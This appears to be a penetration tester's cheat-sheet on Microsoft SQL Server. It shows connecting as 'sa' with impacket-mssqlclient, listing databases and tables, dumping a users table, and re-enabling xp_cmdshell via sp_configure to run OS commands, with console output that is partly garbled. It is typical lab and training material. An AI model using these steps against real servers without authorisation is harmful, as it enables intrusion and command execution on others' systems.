#### Connection

```bash
impacket-mssqlclient sa@10.11.1.31 -p 1433 -db tempdb
```
#### MSSQL basic commands

```bash
# Show databases available
select name from sys.databases
# It also works for the same but as a store procedure
sp_databases
# Select the database for list its content
use streamio_backup
# List the name of the tables from a database
select * from information_schema.tables;
# List all the tables from a db
select table_name FROM dba_tables;
# List all from a table
select * from users;
```

#### Command execution from MSSQL
If we have access to the MSSQL we can try to execute commands from MSSQL:
```bash
SQL> xp_cmdshell "whoami"
[-] ERR0R(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component ,xp_cmdshellâ€™ because this component is turned off as part of the security figuration for this server. A system administrator can enable the use of ,xp_cmdshell' by using sp_configure. For more information about enabling 'xp.cmdshell', search for p_cmdshell' in SQL Server Books Online.
SQL> sp_configure "xp_cmdshell", 1
[-] ERR0R(TALLY): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
SQL> sp_configure "show advanced options", 1
[*] INF0(TALLY): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> sp_configure "xp_cmdshell", 1
[*] INF0(TALLY): Line 185: Configuration option 'xp.cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> xp_cmdshell "whoami"
```
